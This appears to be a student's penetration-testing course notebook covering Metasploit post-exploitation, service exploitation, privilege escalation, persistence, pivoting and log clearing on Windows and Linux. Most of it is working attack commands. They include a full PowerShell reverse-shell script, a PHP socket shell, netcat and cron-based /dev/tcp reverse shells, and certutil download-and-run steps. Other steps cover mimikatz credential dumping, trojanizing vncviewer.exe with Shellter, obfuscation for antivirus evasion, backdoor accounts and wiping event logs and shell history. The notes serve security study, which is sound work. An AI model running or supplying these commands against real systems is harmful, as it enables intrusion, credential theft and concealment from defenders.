![Screenshot from 2024-08-15 23-14-32.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/5b559fd1-44a9-48a9-ace5-96e04c706280/0e5ad2d0-89c2-4e4f-9af4-d7aaa0143128/Screenshot_from_2024-08-15_23-14-32.png)

Post-exploitation also includes Local Enumeration, Dumping Hashes, Pivoting.

- `meterpreter > sysinfo` - system information
- `meterpreter > getuid` - username
- `meterpreter > help` - a list of commands
- `meterpreter > bg` - background or CTRL + Z
- `meterpreter > download`, `upload <file>`
- `meterpreter > ls`, `cd`, `cat`, `edit`
- `meterpreter > checksum md5 /bin/bash` - getting md5 hash of a binary (command)
- `meterpreter > getenv SHELL` - echo $SHELL
- `meterpreter > search -d /usr/bin -f *backdoor*`
- `meterpreter > shell` - cmd or bash
- `meterpreter > ps` - processes
- `meterpreter > migrate <ps.id>`
- `meterpreter > use shell_to_meterpreter`
- or `bg`, then`sessions -u 1`

## Post-Exploitation

## Windows

Some modules for local enumeration:

- `meterpreter > screenshot`- gives a screenshot of the machine remotely
- `meterpreter > getsystem` - for elevating privileges automatically
- `meterpreter > hasdump` - for dumping hashes (you need to be NT AUTHORITY, you must migrate to lsass)
- `meterpreter > show_mount` - shows Drives
- `meterpreter > cd C:\\` - for the root of the Drive

- `msf6 > use win_privs` - equals to `getprivs` (only shows current privileges of a user)
- `msf6 > use enum_logged_on_users` - users on the system
- `msf6 > use checkvm` - for checking if a machine is VM
- `msf6 > use enum_applications` - for installed apps
- `msf6 > loot` - for saved results of previous modules
- `msf6 > use enum_av` - for installed AV tools\
- `msf6 > use enum_computers` - checking if our compromised machine is part of a domain
- `msf6 > use enum_patches`
    - `meterpreter > shell`
    - `C:\Windows\system32 > systeminfo` - for patches
- `msf6 > use enum_shares`
- `msf6 > use enable_rdp`

### Bypassing UAC with bypassuac_injection:

- `meterpreter > pgrep explorer`
- `meterpreter > migrate <explorer.id>` - for x64 architecture
- `meterpreter > getuid`
- `meterpreter > shell`
    - `C:\> net localgroup administrators` - our username (`getuid`) must be here, then we can bypass UAC

- `msf6 > use bypassuac_injection` - for in memory injection (stealth)
    - `msf6 > set session 1`
    - `msf6 > set TARGET Windows x86` or `x64`
    - `msf6 > set payload windows/x86`or`x64…`
    - `meterpreter > getsystem` - for escalating privs after injection

### Token Impersonation with Incognito:

You must have **Create Token** or **Assign** **Token** or **Impersonate** privileges (look for typing `getrpivs`)

- `meterpreter > load incognito`
- `meterpreter > list_tokens -u`
- `meterpreter > impersonate_token ‘<administrator>’`

### Dumping hashes with Kiwi (mimikatz.exe in msf):

You must be administrator.

- `meterpreter > pgrep lsass`
- `meterpreter > migrate <lsass.id>`
- `meterpreter > load kiwi`
- `meterpreter > creds_all`
- `meterpreter > lsa_dump_sam`
- `meterpreter > lsa_dump_secrets`

- `meterpreter > upload mimikatz.exe`
    - `meterpreter > shell`
- `C:\> .\mimikatz.exe`
- `mimikatz # privilege::debug` - checking if we have damn privilege
- `mimikatz # sekurlsa::logonpasswords`
- `mimikatz # lsadump::sam`
- `mimikatz # lsadump::secrets`

### Pass-the-Hash:

- `meterpreter > pgrep lsass`
- `meterpreter > migrate <id.lsass>`
- `meterpreter > hashdump` - for LM:NTLM hashes of all users in the damn system

- `msf6 > use smb/psexec`
    - `msf6 > set SMBUser administrator`
    - `msf6 > set SMBPass <LM:NTLM.hash>`

### Establishing Persistence with persistence_service:

Keeping access to target hosts across restarts, changed credentials, and other interruptions

- `meterpreter > bg`
- `msf6 > use persistence_service`
    - `msf6 > set session 1`
    - `msf6 > set payload windows/meterpreter/reverse_tcp`
    - `msf6 > set LHOST, LPORT <…>`
- `msf6 > sessions -K` - terminating all sessions

- `msf6 > use multi/handler`
    - `msf6 > set payload windows/meterpreter/reverse_tcp`
    - `msf6 > set LHOST, LPORT <…>`
- `meterpreter >`

### Enabling RDP:

- `meterpreter > bg`
- `msf6 > use enable_rdp`
    - `msf6 > set session 1`

- `msf6 > sessions 1`
- `meterpreter > shell`
- `C:\> net user administrator password1` - changing the password of administrator user

- `xfreerdp /u:administrator /p:password1 /v:<target.ip>`

### Keylogging with keyscan_start, dump:

The process of capturing keystrokes

- `meterpreter > pgrep explorer`
- `meterpreter > migrate <id>`
- `meterpreter > keyscan_start` - starting keylogger
- `meterpreter > keyscan_dump` - dumping

If it doesn’t work, then we must stop (`keyscan_stop`) and start (`keyscan_start`) then dump (`keyscan_dump`) again and again

### Clearing event logs:

Event logs are users’ actions/events that are stored by Windows OS. It is the first stop for forensic investiogation if there is a compromise.

Clearing event logs are crucially important. They are stored in the Event Viewer app.

We have 3 types of event logs: Application, Security, System logs.

- `meterpreter > clearev` - too simple?

Then deleting all uploaded files, etc.

### Pivoting:

After compromising a target host, beginning to attack another host, whose internal network is not available to us but our compromised target.

- `meterpreter > ipconfig` for Windows or ||`shell`, then `ifconfig` for Linux

*** WE will see another subnet or the same one again, but we cannot reach any of them (new subnet or the same one but with new ip)

- `meterpreter > **run autoroute** -s <2nd-target>/20` or `24` (for Linux) - only applicable to the MSF
- `meterpreter > bg`
- `msf6 > sessions -n victim-1 -i 1` - for naming
- `msf6 > use portscan/tcp`
    - `msf6 > set RHOSTS <2nd-target>`
    - `<ip>:80` - we discover port 80 (for example absolutely)
- `meterpreter > **portfwd add** -l 1080 -p 80 -r <2nd-target>`
- `nmap -p1080 -sCV <local_ip>`
- `msf6 > use exploit…`
    - `msf6 > set RHOSTS <2nd-target>`
    - `msf6 > set payload windows/meterpreter/bind_tcp`  - not reverse
    - `msf6 > set LPORT <lport>` - changing the local port because this is our second exploitation (the first one is used by our previous meterpreter session)

- `meterpreter > search -d C:\\Users\\Administrator -f *flag***`

## Linux

Local Enumeration:

- `meterpreter > getuid`, `sysinfo`
- `meterpreter > shell`
- `root@domain: cat /etc/passwd` - users in the server
- `root@domain: cat /etc/shadow` - password hashes of current users
- `root@domain: uname -a` - kernel info
- `root@domain: netstat -antp` - listening services in the system
- `root@domain: ps aux` - running processes
- `root@domain: env` - enviroment variables

- `meterpreter > use enum_configs` - config files enumeration
- `meterpreter > use gather/env`
- `meterpreter > use enum_network`
- `meterpreter > use enum_protections` - finds security mechanisms
- `meterpreter > use enum_system` - system info, users list, cron jobs, user history
- `meterpreter > use checkcontainer`
- `meterpreter > use checkvm`
- `meterpreter > enum_users_history`

### Privilege escalation with chkrootkit versions before 0.5:

- `meterpreter > shell`, then `ps aux`, we will see `/usr/bin/chkrootkit`
- `meterpreter > bg`
- `msf6 > use chkrootkit`
    - `set CHKROOTKIT <path>`
    - `set sessions 1`

### Dumping hashdump with the hashdump module:

- `meterpreter > bg`
- `msf6 > use linux/gather/hashdump`
    - `set session 1`
- `msf6 > loot` - for saved results (passwd.txt, shadow.txt, unshadowed.pwd)

Unshadowed files are for cracking hashes.

### Persistence with sshkey_persistence:

- `meterpreter > shell`

Below is optional:

- `root@blsht: useradd -m -d /var/www/html -s /usr/bin/bash ftp` - creating a convincing backdoor username (`ftp`), his shell and home directory
- `root@blsht: passwd ftp` - setting a password
- `root@blsht: usermod -aG root ftp` - adding our ftp user to the root group
- `root@blsht: usermod -u 15 ftp` - changing the user id of ftp
- `meterpreter > bg`

- `msf6 > use service_persistence` or `cron_persistence`
    - `msf6 > set session 1`
    

The best one:

- `msf6 > use sshkey_persistence`
    - `msf6 > set session 1`
    - `msf6 > set CREATESSHFOLDER true`
- `msf6 > loot`
- `msf6 > cat id_rsa.txt`
- `root@kali# chmod 400 id_rsa.txt`
- `root@kali# ssh -i id_rsa root@<ip>`

## Armitage (GUI Metasploit)

Provides us with visualization of targets, automation of exploitation and post-exp, etc. Requires the Metasploit database.

**Fundamentals**:

Hosts → Add Hosts → <target.ip>

Right click to the target → Scan — port scanning

Hosts → Nmap Scan → Quick Scan (OS detect) 

Attacks → Find Attacks → Ok

Right click to the target → Host → OS — for choosing the target OS (optional)

View → loot

Searching exploit name → Use a reverse connection → Launch

Right click to the target → Meterpreter 1 → Interact → Meterpreter shell

Right click to the target → Meterpreter 1 → Explore → Browse FIles → Upload — for uploading files if needed

---

**Pivoting**:

Right click to the target → Meterpreter 1 → Pivoting → Setup → Add pivot — for running autoroute

Hosts → Add Hosts → <2nd-target>

Search tcp scan → Launch (for 2nd-target) 

`meterpreter > portfwd add -l 1080 -p 80 -r <2nd-target>`

`msf6 > db_nmap -sV -p 1080 127.0.0.1`

Search exploit name (badblue 2.7) → RHOSTS <2nd-target> → Launch

# Exploitation (Host & Net)

Tactics, techniques & procedures for gaining an initial foothold on the targets system. (Good enumeration is crucial!)

### Banner Grabing

Enumerating **services** and their **versions** using Nmap, netcat, and direct authentication.

Nmap:

- `nmap -sV -O <ip>`
- `nmap -sV —script=banner -p21 <ip>` - FTP banner grabing

Netcat:

- `nc <ip> 21` - FTP banner grabing with netcat (basic TCP connection with a target)

Direct auth:

- `ssh root@<ip>` - SSH banner grabing with a direct auth

### NSE for vuln scanning

- `nmap -sV -O —script=http-shellshock —script-args=http-shellshock.uri=<url.cgi> -p80 <ip>` - checks if it is vulnerable to shellshock

### MSF for vuln scanning

- `msf6 > use auxiliary/scanner/smb/smb_ms17_010` - for scanning
- `msf6 > use exploit/windows/smb/ms17_010_eternalblue` - for exploiting

### Searching exploits

[exploit-db.com](http://exploit-db.com) - publicly available exploits

[rapid7.com/db](http://rapid7.com/db) - information about vulnerabilities

[packetstormsecurity.com](http://packetstormsecurity.com) 

```
site:exploit-db.com openssh 7.2 - using Google Dorks
site:github.com vsftpd 2.3.4 - Not too reliable (GitHub)
```

**Searchsploit**:

Offline Exploit-db database 

- `searchsploit vsftpd 2.3.4`
- `searchsploit -m <exploit.id>` - copies the exploit file (**mirroring**)
    - `searchsploit -m 49757` - for copying the vsftpd 2.3.4 backdoor exploit file
- `searchsploit -c OpenSSH` - **case** sensitive search
- `searchsploit -t openssh` - openssh in the **title**
- `searchsploit -e ‘Apache 2.4’` - **exact** search
- `searchsploit remote windows smb`
- `searchsploit vsftpd -w` - gives **URLs** not IDs

### Fixing Exploits

- `searchsploit hfs 2.3`
- `searchsploit -m 39161` - for copying (mirroring) rejetto 2.3 exploit file
- Changing `ip_addr` and `local_port` values inside of the file
- `cp /usr/share/windows-resources/binaries/nc.exe .`- we must host nc.exe for exploitation
- `python3 -m http.server 80` - we must host nc.exe for exploitation
- `nc -nlvp 1234`
- `python3 [39161.py](http://39161.py) <target> 80` - downloads nc.exe from our web server, and we get a reverse shell.

***If it doesn’t work, then we must run the exploit file again until it works.

### Compiling Exploits

Compiling is transforming source code (.c) to machine code (executable format - binary)

Cross-Compiling is the process of compiling code for a platform (WIndows).

We will compile code into a binary (Linux) or PE (Portable Executable for WIndows).

- `i686-w64-mingw32-gcc 9303.c -o vlc64.exe` - compiling for Windows for 64 bit machines
- `i686-w64-mingw32-gcc 9303.c -o vlc32.exe -lws2_32` - 32 bit compiling (windows)

- `gcc -pthread 40839.c -o dirtycow -lcrypt` - for Linux (.elf binary - Excutable and Linkable Format)
- `gcc exploit.c -o exploit` - More common

Bin-sploits in Github - pre-compiled exploits

### Netcat (Bind & Reverse shells)

A network utility used for reading and writing data to network using TCP/UDP. Available for both Unix and Windows (not pre-packaged).

Capable of doing:

1. Banner grabing 
2. Transfering files
3. Bind/Reverse shells

1. Banner Grabing via UDP:
    1. - `nc -nvu <ip> <port>` - No-DNS, Verbose and UDP banner grabing
    
2. Setting up a listener (server mode):
    
    Between Linux and Windows hosts: 
    
    - `cp /usr/share/windows-resources/binaries/nc.exe .` - we send nc.exe because on Windows it **doesn’t** come pre-packaged
    - `python -m http.server 80`
    - On the Windows host: `certutil -urlcache -f http://<local.ip>/nc.exe nc.exe`
    - `nc -nlvp 1234` - No-Dns, Listen mode, Verbose, Port 1234
    - On the Windows host: `.\nc.exe -nv <local.ip> 1234`
        - Connection established. When we write ‘hello’ on any host, we see it on both systems.

1. Transfering files from Linux to Windows:
    1. On windows: `.\nc.exe -nlvp 1234 > given.txt` - saves the communication into the file.
    2. On Linux: `nc -nv <windows.ip> 1234 < message.txt` - sends and windows saves as ‘given.txt’
    
2. **Bind** Shells:
Attacker directly connects to a target’s listener in which a target hosts a shell (cmd.exe, /bin/bash, etc) with netcat.
    
    Bind shells are not good because a target must set up a listerner, and firewalls can detect the inbound connection.
    
    - On a windows target: First we send nc.exe from ourselves to the target
    - On the windows target: `.\nc.exe -nlvp 1234 -e cmd.exe`
    - On a Linux host: `nc -nv <windows.ip> 1234` -  we get a bind shell which is cmd.exe
    
    Switching roles:
    
    - On a Linux target: `nc -nlvp 1234 -c /bin/bash`
    - On a Windows host: `.\nc.exe -nv <linux.ip> 1234` - we get a bind shell (bash) on our Windows host

1. Reverse shells:
    
    Target connects to an attacker’s listener.
    
    - On a Linux host: `nc -nlvp 1234`
    - On a Windows target: `nc -nv <linux.ip> 1234 -e cmd.exe`
    
    Switching roles:
    
    - On a windows host: `.\nc.exe -nlvp 1234`
    - On a Linux target: `nc -nv <windows.ip> 1234 -c /bin/bash`
    
    ***Note: In a reverse shell a Linux target can connect using bash, python, php, etc not only netcat itself. If windows then only using powershell and netcat code.
    
    Reverse shell cheatsheet in GitHub.
    
    [revshells.com](http://revshells.com) - reverse shell generator
    

### PowerShell-Empire

PowerShell-Empire is a PowerShell (written in mostly) framework used for exploitation/post-exploitation. (mostly for windows exploitation)

Starkiller is a GUI frontend for PowerShell-Empire.

Installing from GitHub - BC Security Empire

- `./ps-empire server`
- `./ps-empire client`
- `(Empire) >` - CLI of ps-empire **client**

In **Starkiller**:

1. Listeners → Create → Type: HTTP  → Submit
2. Stagers → Create → Type: windows_csharp_exe → Submit → Stagers → Actions → Download
3. `python -m http.server 80` - On our host
4. `certutil -urlcache -f http://<local>/stager.exe stager.exe` - On our target
5. `.\stager.exe` - On our target for getting a reverse shell in our Starkiller session
6. Agents → Actions → View → Name (Naming our target) — Shows our remote access
    1. Click to the agent → Interact → Shell Command (whoami) → Right arrow on the top (for results of our commands)
    2. Click to the agent → FIle Browser (Gives all files on our target) — We can upload and download files like in meterpreter
7. `(Empire) > agents`
8. `(Empire) > interact <agent.name>`

### Windows Exploitation

Black-box pentesting - we are not provided with anything, other than a company name (no ip ranges at all)

Indentifying and Exploiting Services:

**FTP**:

- `nmap —script=ftp-anon -p21 <ip>`
- `hydra -L <unix_users.txt> -P <unix_passwords.txt> ftp://<ip>`
- `msfvenom -p windows/shell/reverse_tcp LHOST=<local> LPORT=1234 -f asp -o shell.aspx`
- `ftp <ip>`
- `ftp> put shell.aspx` -  uploading our reverse shell
- `msf6 > use multi/handler`
- *http://<ip>/shell.asp* -  for executing our reverse shell

Defacing the website: (changing)

- `ftp> get index.html`
- `nano index.html` - changing the file (web server file)
- `ftp> put index.html` - uploading the defaced file, and the website’s look will be different

**OpenSSH**:

- `hydra -l administrator -P <unix_passwords.txt> ssh://<ip>`
- `ssh administrator@<ip>`
- `msf6 > use ssh_login`
- `msf6 > sessions -u 1`
- `C:\> whoami /priv` - equals to `getprivs` in a meterpreter session

**SMB**:

- `hydra -l administrator -P <unix_passwords.txt> smb://<ip>`
- `smbclient -L -U administrator <ip>` - we must provide the password as well (for listing shares)
- `smbmap -H <ip> -u administrator -p <password>` - listing shares
- `enum4linux -a -u administrator -p <password> <ip>` - listing all (`-a`)
- `msf6 > use smb_enumusers`
- `python3 [psexec.py](http://psexec.py) administrator@<ip>` or `msf6 > use smb/psexec` - gives cmd.exe
- `msf6 > use ms17_010_eternalblue`

**MySQL**:

- `msf6 > use mysql_login`
- We have `C:\wamp\www` directory on Windows and it serves like `/var/www/` - serves for the website (includes index.html)
- `meterpreter > download C:\wamp\alias\phpmyadmin.conf` - config file for /phpmyadmin directory
- `nano phpmyadmin.conf`
    - we adjust it like - `Allow from all`
    - In this way everyone can access it if the access was denied before.
- `meterpreter > upload phpmyadmin.conf`
- `meterpreter > shell`
    - `C:> net stop wampapache`
    - `C:> net start wampapache`
    - We restart the web server for made changes.
- In the *http://<ip>/phpmyadmin* directory (in the website) we can change admin panel password → *wp_users* → changing *user_pass* for the admin user → going /wordpress/wp-admin with new credentials

### Linux Exploitation

If we have suspicious services like `exec?` or `login?` (question mark in the end) then it would be good to connect with using `nc` . It is possible that we can connect to a bind-shell listener or we can get the actual service info and version.

**VsFTPD**:

vsftpd 2.3.4 is vulnerable to a malicious backdoor that is added to the download archive of vsftpd.

- `msf6> use vsftpd_234_backdoor` or `searchsploit vsftpd 2.34`
- ***But it will not work because the admin already patched the version of the service.
- ******It is important that a service can be vulnerable, but it is possible that the service is already **patched** as in this case.

- `msf6 > use smtp_enum` - for SMTP user enumeration which is also valid for FTP
- `hydra -l service -P <unix_passwords.txt> ftp://<ip> -t 64`
- It is possible that other service acounts don’t have any passwords which will not give any results in `hydra`, so we must use proper names as usernames.
- `nano /usr/share/webshells/php/php-reverse-shell.php` - changing the port number and the ip address
- `ftp <ip>`
- `ftp> cd /var/www/dav`
- `ftp> put php-reverse-shell.php`
- `nc -nlvp 1234`
- Clicking php-reverse-shell.php in *http://<ip>/dav*

**PHP**:

- If a webserver is Apache, we can check *http://<ip>/phpinfo.php* - for the **version** info
- `searchsploit php <version>` - versions under **5.3.12** are vulnerable to a command injection
- `searchsploit -m 18336`
- `nano [18836.py](http://18836.py)` - changing `pwn_code` line to a php reverse shell executable (`<?php $sock=fsockopen("**10.10.10.10**",**9001**);exec("**sh** <&4 >&4 2>&4");?>`)
- `nc -nlvp 1234`
- `python2 18836.py <ip> <port>`

**SAMBA**:

- `msf6 > use smb_version` - gives the exact version of SMB (very useful)
- `searchsploit samba 3.0.20`
- `msf6 > use samba/usermap_script` - RCE for the version 3.0.20
- `msf6 > sessions -u 1` - for a meterpreter session (upgrading)

### Evasion

The use of various tools to avoid AV detection.

There are some **AV Detection techniques**:

1. Signature based: AV tools have malware signature (code - hash that are extracted from malware) databases. When they are analyzing malicious code, they compare it to their signatures. It can be bypassed via changing the malware’s byte sequence (signature).
2. Heuristic-based: Some rules and decisions (analyzes the code)
3. Behaviour based: Monitoring malware’s behaviour (what does the malware access when it runs, etc)

**Evasion techniques:**

On-disk obfuscation:

- Obfuscation - Concealing our payload
- Encoding - changing the data format (then can be decrypted)
- Packing - genrating our payload with new binary structure and changing its signature
- Crypters - Encrypts the payload then decrypts in the memory

In-memory obfuscation:

- Injection shellcode into a running process. A payload is only present in RAM not in SSD

**Shellter**:

Used for **injecting** shellcode (payloads) into Windows applications.

Shellter is a PE (Portable Executable), but we can use **`wine**32` bit for execute this on Unix.

- `cp /usr/share/windows-binaries/vncviewer.exe .`
- `shellter` then `A` for Auto then `/home/user/vncviewer.exe` for the path of the executable then `Y` for enabling stealth mode like -k in msfvenom (keeping the functionality of the executable) then `L` for listed payloads then `1` for meterpreter/reverse_tcp then `LHOST` and `LPORT`
- Our `vncviewer.exe` has become malicious! (contains the payload)
- `python -m http.server 80`
- `certuril -urlcache -f http://<local.ip>/vncviewer.exe vncviewer.exe` - On a Windows target
- `msf6> use multi/handler`
- `.\vncviewer.exe` on the target will work properly like the **real** vncviewer, but the attacker will get a `meterpreter >` shell

**Invoke-Obfuscation:**

- `git clone <invoke-obfuscation.git>` - from GitHub
- `$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()` - saving this as `shell.ps1`. It is a PowerShell script for reverse shell

In **PowerShell** below:

- `Import-Module ./Invoke-Obfuscation.psd1`
- `Invoke-Obfuscation`
- `Invoke-Obfuscation> SET SCRIPTPATH /home/user/shell.ps1`
- `Invoke-Obfuscation> AST`
- `Invoke-Obfuscation> ALL`
- `Invoke-Obfuscation> 1`
- Then copying the result of obfuscated script and saving as `obfuscated-shell.ps1`

- `python -m http.server 80`
- `certuril -urlcache -f http://<local.ip>/obfuscated-shell.ps1 obfuscated-shell.ps1` - On a Windows target
- `nc -nvlp 1234`
- running `obfuscated-shell.ps1` with PowerShell

# Post-Exploitation (Host & Net)

The final phase of the pentesting life cycle - Tactics, techniqiues & procedures that adversaries undertake (begin to do) after gaining an initial foothold on a target system.

Methods will **differ** based on the target OS and privileges.

Rules of engagement must be taken into consideration (can you clear the logs? can you change passwords? etc)

![Screenshot from 2024-08-22 17-10-34.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/5b559fd1-44a9-48a9-ace5-96e04c706280/e244b3e9-aba7-4ae4-a9cf-90808265d24e/Screenshot_from_2024-08-22_17-10-34.png)

## Local Enumeration

### Windows Local Enumeration

### System info

- `meterpreter > getuid` and `sysinfo` - gives hostname & username, then OS info
- `meterpreter > shell`
    - `C:\> hostname`
    - `C:\> whoami`
    - `C:\> systeminfo` - gives every info above us as well as the hotfixes (patches for vulnerabilities)
    - `C:\> wmic qfe get Caption,Description,HotFixID,InstalledOn` - gives info about the link of the hotfix, description, id, and install date
        - We search for `Description: Security Update` because they are the important ones.
    - `meterpreter > cat C:\\Windows\\System32\\eula.txt` - gives OS version

### Users and groups

Note: the administrator account is disabled by default by Microsoft for security reasons.

- `meterpreter > getprivs`
- `msf6> use enum_logged_on_users`  `set session 1`
- `meterpreter > shell`
    - `C:\> whoami /priv` - equals to `getprivs`
    - `C:\> query user` - logged on users on the system
    - `C:\> net users` - all users
    - `C:\> net user administrator` - full additional info about the user
    - `C:\> net localgroup` - groups
    - `C:\> net localgroup administrators` - users the are part of the group

### Network

- `C:\> ipconfig`
- `C:\> ipconfig --all` - additional info
- `C:\> route print` - gateway info
- `C:\> arp -a` - all devices and their MAC addresses
- `C:\> netstat -ano` - running services and their ports on the target
- `C:\> netsh firewall show state` - show the firewall state
    - or
    - `C:\> netsh advfirewall show allprofiles`

### Running Services and Processes

Process is an executable that is running, service is a process that is running in the background

- `meterpreter > ps` - running processes
    - If we are not privileged, we will not see the owners (users) of processes.
- `meterpreter > pgrep explorer.exe`
- `meterpreter > migrate <pid>`
- `C:\> net start` - active services
- `C:\> wmic service list brief` - all services
- `C:\> tasklist /SVC` - processes and their corresponding services
- `C:\> schtasks /query /fo LIST` - scheduled tasks || or `schtasks /query /fo LIST /v` - for additional info

### Automating Windows Local Enumeration

- `msf6> use winrm_script_exec`
    - `set FORCE_VBS true`
- `meterpreter > show_mount` - Drive info
- `msf6> use win_privs`, `checkvm`, `enum_logged_on_users`, `enum_applications`, `enum_computers`  (part of a network - domain), `enum_patches`, `enum_shares`
- `wget https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1`
- `meterpreter > cd C:\\temp\\`, `upload jaws-enum.ps1`
- `meterpreter > shell`
    - `C:\> powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFileName jaws-enum.txt`
- `meterpreter > download jaws-enum.txt`

### Linux Local Enumeration

### System info

- `meterpreter > sysinfo`
- `meterpreter > shell`
    - `hostname`
    - `env` - environment variables
    - `cat /etc/*release` - gives info about the distribution (`/etc/issue` only gives the name of distrb)
    - `cat /etc/shells` - the list of available shells
    - `uname -a` - hostname, kernel version, architecture
    - `uname -r` - kernel version
    - `lscpu` - CPU information
    - `free -h` -RAM usage
    - `df -h` - disk usage `df -ht ext4` - shows only ext4 format disk
    - `lsblk` - disk partition info
    - `dpkg -l` - installed Debian packages

### Users and Groups

- `meterpreter > shell`
    - `groups bob` - show groups that bob is part of
    - `cat /etc/group` - all groups available
    - `cat /etc/passwd` - users and services
        - `root:x:0:0:root:/root:/usr/bin/bash` -*user:pass:uid:gid:full-name:home-dir:shell*
    - `useradd -m john -s /usr/bin/bash` - we’ll have `/home/john` directory
    - `usermod -aG root john` - adding our user to the root group
    - `w` or `who` - gives logged on users
    - `last` - last logged on users

### Network

- `netstat -ano` - listening or established services
- `route` - gateway (router) address
- `ip a s` - network interfaces
- `cat /etc/hosts` - all hosts
- `cat /etc/resolv.conf` - DNS address of the host
- `arp -a` - MAC addresses

### Processes and Cronjobs

- `ps` or `top`- running processes (`top` is dynamic)
- `ps -aux` - all running processes
- `crontab -l` or `cat /etc/cron*`- cronjobs

### Automating Linux Local Enumeration

- `meterpreter > bg`
    - `msf6> use enum_configs`
    - `msf6> use enum_network`
    - `msf6> use enum_system`
    - `msf6> use checkvm`
- `meterpreter > cd /tmp`
- `meterpreter > upload [LinEnum.sh](http://LinEnum.sh)` - from GitHub
- `meterpreter > shell`
    - `chmod +x LinEnum.sh`
    - `./LinEnum.sh`

## Transferring files

### Web server with python

- `cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .`
- `python2 -m SimpleHTTPServer 80` or `python3 -m http.server 80`

Downloading for Windows:

- `C:\> cd C:\\Temp`
- `C:\> certuril -urlcache -f http://<local.ip>/mimikatz.exe mimikatz.exe`

Downloading for Linux:

- `cd /tmp`
- `wget http://<local.ip>/<file>`

Just a **note** (not related to the topic):

1. We can use `tmux` for creating many tabs within one tab
2. CTRL + B, then just C → for creating a new tab in `tmux`
3. CTRL + B, then 0 or 1 → for swtiching between windows
4. CTRL + B, then PAGEUP and PAGEDOWN - for scrolling
5. CTRL + B, then D → for quiting

## Upgrading shells (for Linux)

- `/bin/bash -i` - interactive bash shell
- `python -c ‘import pty; pty.spawn(”/bin/bash”)’` - improves interactivity, good for remote shells
- `perl -e ‘exec “/bin/bash”;’`
- `ruby -e ‘exec “/bin/bash”;’`
- `export TERM=xterm`
- `export SHELL=/usr/bin/bash`
- `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`

## Privilege Escalation

### Windows:

- `msf6> use web_delivery` - if we have remote access to our target, it gives us a command to be run on the target system which downloads and executes the payload
    - `set target PSH\ (Binary)` - PSH (PowerShell)
    - `set PSH-EncodedCommand false` - it is an advanced option
    - `set payload windows/shell/reverse_tcp`
    - `set LHOST <local.ip>`
    - `run`
    - **Copying** our generated powershell code and running on the target
    - we get a shell session, then.
    - CTRL + Z → for background
    - `msf6 > use shell_to_meterpreter`
        - `set session 1`
        - `set WIN_TRANSFER VBS`
        - `run`
- `meterpreter > pgrep explorer.exe`, `migrate <pid.explr>`
- `meterpreter > upload PrivescCheck.ps1` - **PrivescCheck** from GitHub (gives PrivEsc vulnerabilities)
- `meterpreter > shell`
    - `C:\> powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck”` - command from GitHub

### Linux:

- `find / -not -type l -perm -o+w 2>/dev/null` - files and directories that are world-writable
- `find / -perm -4000 2>/dev/null` - files that have SUID bits
- `openssl passwd -6 -salt abc password123` - generating SHA-512 ($6) hashed password with the salt of abc

- `sudo -l` - privileges of the current user
    - result: `(root) NOPASSWD: /usr/bin/man`
- `sudo man man`
    - `!/bin/bash` - from [gtfobins.github.io](http://gtfobins.github.io)

## Persistence

### Windows:

Requires elevated privileges

- `msf6 > use persistence_service` - generates a payload and uploads, creates a new service which executes the payload when the service is running
    - `set session 1`
- `msf6> use multi/handler`
    - `set payload <the.same.with.the.persistence>`
    

**Via RDP:**

- `meterpreter > run getgui -e -u bob -p password123` - enables RDP, creates a user, hides from winlogon.exe, and adds our user to the administrators and remote users group
- `xfreerdp /u:bob /p:password123 /v:<ip>`

### Linux:

**Via SSH:**

- `scp root@<ip>:~/.ssh/id_rsa .` - obtaining the private key of the root user
- `chmod 400 id_rsa`
- `ssh -i id_rsa root@<ip>`

**Via Cronjobs:**

- `echo ‘* * * * * /bin/bash -c “/bin/bash -i>&/dev/tcp/<local.ip>/1234 0>&1”‘ > cronjob` - runs the command every minute
- `crontab -i cronjob` - adds to cronjobs
- `nc -nlvp 1234`

## Dumping & Cracking Hashes

**NTLM** is a suite of authentication protocols by Microsoft and not a hash algorithm. But it uses MD4 for hashing, so when we talk about NTLM hashes, it is a variation MD4.

**Windows**:

- `meterpreter > pgrep lsass`
- `meterpreter > migrate <lsass.pid>` - lssas is responsible for **authentication** and **verification** credentials
- `meterpreter > hashdump`
    - saving the full results as `hashes.txt`
- `john --list=formats` - shows hashing algorithms that are available for john
- `john —format=NT —wordlist=<list> hashes.txt`
- `hashcat -m 1000 -a 3 hashes.txt /usr/share/wordlists/rockyou.txt` (`-m` for a hash type, `-a` for an attack type)

**Linux**:

- `cat /etc/shadow`
    - **copying only the hash as** `hash.txt`
- `john —format=sha512crypt —wordlist=/usr/share/wordlists/rockyou.txt hash.txt`
- `hashcat -m 1800 -a 3 hash.txt /usr/share/wordlists/rockyou.txt`

## Pivoting

- `meterpreter > ipconfig`
- `meterpreter > run autoroute -s <ip>/24`
- `msf6> use portscan/tcp`
    - `set rhosts <ip>`
- `meterpreter > portfwd add -l 1080 -p 80 -r <ip>`
- `nmap -sV -p 1080 127.0.0.1`
- `msf6> use badblue_passthru` - second exploitation after port forwarding
    - `set payload windows/meterpreter/**bind_tcp**`
    - `set rhosts <ip>`

## Clearing logs

### Windows:

Transfer files to the `C:\Temp` directory because we must **delete** them afterwards. Some metasploit modules aren’t able to delete files, so they specify the path for the file for us to **delete**. Some of them (persistence_service module) generate resource scripts to undo all actions. `meterpreter > resource <script.rc>` - for running

- `meterpreter > clearev` - cleares all even logs (dangerous, must be agreed with clients)
- Keep taking notes of files that you upload!

### Linux:

Transfer files to `/tmp`       `meterpreter > resource <script.rc>`

- `history -c` - clearing history
- `cat /dev/null > .bash_history`

# Social Engineering (Host & Net)

# Introduction to the Web & HTTP (Web Application Pentesting)

